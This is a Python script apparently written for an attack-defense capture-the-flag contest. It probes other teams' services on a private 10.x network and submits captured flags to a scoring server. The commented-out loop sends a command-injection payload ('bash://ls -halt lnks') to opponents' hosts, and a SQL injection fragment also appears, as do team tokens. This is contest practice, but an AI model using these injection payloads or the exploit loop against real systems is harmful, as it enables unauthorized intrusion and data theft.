# coding=utf8
from bs4 import BeautifulSoup
import requests
import os
import subprocess
import json
from fake_useragent import UserAgent

urls = f'http://10.60.4.3:6969/#/register'
# user_agents = {}
# ua = UserAgent()
# user_agents['chrome'] = ua.random
# headers = {'accept': '*/*', 'user-agent': ua.random}
# response = requests.get(url, cookies=cookies, proxies=proxies)
# soup = BeautifulSoup(response.text, "html.parser")

# country = '{"name": "United States", "population": 331002651}'
# country_dict = json.loads(country)
#
# print(type(country_dict))
# print(country_dict['name'])


param = {'name': 'sosat_eto_talant', 'password': '1dadadadadadadadadadadada'}
my_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36",
    "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://10.60.4.3:6969",
    "Referer": "http://10.60.4.3:6969/", "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7"}
session = requests.Session()
response = session.get(urls, headers=my_headers)
print(response.text)

response = requests.get(urls, data=param)
# resp = requests.post(urls, data=param)
soup = BeautifulSoup(response.text, "html.parser")
#print(soup)
# payload = "'+OR+1=1)+AT+DATABASE+(d303eae8-024c-4e6e-87fb-c7e867efd808))"
# cmd_1 = f""" curl -s -H 'X-Team-Token: CLOUD_18_d74ddccd3cffdf58ea3a01fe677e0b12' https://monitor.ructf.org/flag_ids?service=5"""
# out = str(subprocess.check_output(cmd_1, shell=True))
# print(out)


#
#
# while True:
#     for i in range(1, 21):
#
#         urls = f'http://10.60.{i}.3:6969/145'
#         break_out_flag = False
#         cmd_1 = f""" curl -d 'url=bash%3A%2F%2Fls%20-halt%20lnks&lnk=145' -X POST http://10.20.{i}.1:3154"""
#         os.system(cmd_1)
#         try:
#             response = requests.get(urls)
#             result = BeautifulSoup(response.text, 'html.parser').prettify()
#             print('Цель - ', urls)
#         except:
#             continue
#         with open(f"flag{i}.txt", "w") as file:
#             file.write(result)
#         with open(f"flag{i}.txt", "r") as file1:
#             for line in file1:
#                 if line.find("html") != -1:
#                     print('Цель защищена- ', urls)
#                     break
#                 if break_out_flag:
#                     break
#                 if line.strip()[41:].find("_") != -1:
#                     urls = f'http://10.20.{i}.1:3154/{line.strip()[41:-4]}'
#                     response = requests.get(urls)
#                     result = BeautifulSoup(response.text, 'html.parser').prettify()
#                     soup = BeautifulSoup(result, "html.parser")
#                     try:
#                         value = str(soup.find('input', {'id': '_lnk'}).get('value'))
#                         flag = value[:-1] + '='
#                         cmd = f""" curl -s -H 'X-Team-Token: 10_4f00cfe8b4eb6e2c' -X PUT -d '["{flag}"]' http://10.20.0.2:8080/flags |  json_pp"""
#                         os.system(cmd)
#                         print()
#                         out = str(subprocess.check_output(cmd, shell=True))
#                         if "Denied:" in out:
#                             break_out_flag = True
#                             break
#                     except:
#                         continue
#
#
